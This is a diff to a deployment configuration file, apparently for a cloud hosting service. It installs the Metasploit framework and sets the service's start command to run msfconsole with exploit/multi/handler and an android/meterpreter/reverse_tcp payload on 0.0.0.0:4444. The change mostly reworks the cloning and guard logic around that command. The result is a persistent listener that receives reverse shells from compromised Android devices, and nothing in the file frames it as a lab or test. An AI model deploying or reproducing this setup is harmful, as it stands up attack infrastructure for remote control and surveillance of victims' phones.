@@ -10,17 +10,18 @@
         },
         "install": {
           "cmds": [
-            "git clone https://github.com/rapid7/metasploit-framework.git /app/msf || true",
-            "cd /app/msf && bundle install --without development test",
+            "git clone https://github.com/rapid7/metasploit-framework.git /tmp/msf || (echo 'Clone failed, retrying...' && git clone https://github.com/rapid7/metasploit-framework.git /tmp/msf)",
+            "cp -r /tmp/msf /app/msf",
+            "cd /app/msf && bundle install --without development test --path vendor/bundle",
             "export PATH=/app/msf:$PATH",
-            "cd /app/msf && msfdb init || echo 'DB init skipped, manual later'"
+            "cd /app/msf && msfdb init || echo 'DB init skipped'"
           ]
         }
       }
     }
-  },
+   },
   "deploy": {
-    "startCommand": "bash -c 'cd /app/msf && export PATH=/app/msf:$PATH && msfdb init && msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j\"'",
+    "startCommand": "bash -c 'if [ -d \"/app/msf\" ]; then cd /app/msf && export PATH=/app/msf:$PATH && msfdb init && msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j\"; else echo \"MSF dir not found, crashing\"; exit 1; fi'",
     "restartPolicyType": "ON_FAILURE"
   }
 }
